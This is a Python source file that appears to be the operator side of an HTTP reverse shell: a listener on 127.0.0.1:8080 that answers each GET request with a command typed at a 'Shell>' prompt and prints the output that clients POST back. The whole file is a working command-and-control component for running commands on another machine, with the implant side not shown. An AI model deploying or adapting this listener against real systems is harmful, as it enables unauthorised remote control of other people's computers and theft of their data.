
# importing required modules
import http.server
import os

HOST = "127.0.0.1"
PORT = 8080

class ServerHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        """ Handling all the GET requests """
        
        # reading command
        command = input("Shell> ")
        # return html status code 200
        self.send_response(200)
        # determine the type of the content
        self.send_header("Content-type", "text/html")
        self.end_headers()
        # write -send- the command to the server
        self.wfile.write(command.encode())

    def do_POST(self):
        """ Handling all POST requests """

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == "__main__":

    # define the class server
    server_class = http.server.HTTPServer
    # define the server address
    server_address = (HOST, PORT)
    # you can read more # https://docs.python.org/3/library/http.server.html
    httpd = server_class(server_address, ServerHandler)

    try:
        # try to start HTTP server
        print("\n")
        print("[-] trying to start HTTP server @ {}:{}".format(server_address[0], server_address[1]))
        print("[+] {}:{} HTTP server is up".format(server_address[0], server_address[1]))
        print("[+] Wating for incomming requests. . .\n")
        httpd.serve_forever()
        os.system("clear")

    except KeyboardInterrupt:
        # key interrupt to terminate HTTP server running proccess
        print('[!] Server is terminated')
        # terminate HTTP server
        httpd.server_close()